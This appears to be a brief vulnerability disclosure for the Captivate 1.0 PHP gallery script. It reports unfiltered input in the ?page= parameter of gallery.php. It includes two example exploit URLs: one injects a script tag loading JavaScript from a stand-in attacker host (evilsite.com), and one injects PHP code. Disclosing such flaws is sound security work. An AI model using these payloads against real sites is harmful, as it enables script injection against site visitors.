Captivate 1.0

Homepage:
http://new-place.org/scripts/

Description:
A basic but highly-customizable PHP gallery script with optional thumbnail creation.  Designed with screencaps in mind, it works best for large galleries of same-sized images. 

Effected files:
gallery.php

Inproper filtering of action ?page= can lead to XSS.

Exploit:
One way to XSS would be renaming your JavaScript file to an image as an XSS vector:
http://www.example.com/gallery.php?page=5<SCRIPT SRC=http://evilsite.com/xss.jpg></SCRIPT>

Anoother one be:
http://www.example.com/gallery.php?page=<?phpinfo();?>

The current version of this script puts slashes in for ' and " but alot of other characters aren't filtered.
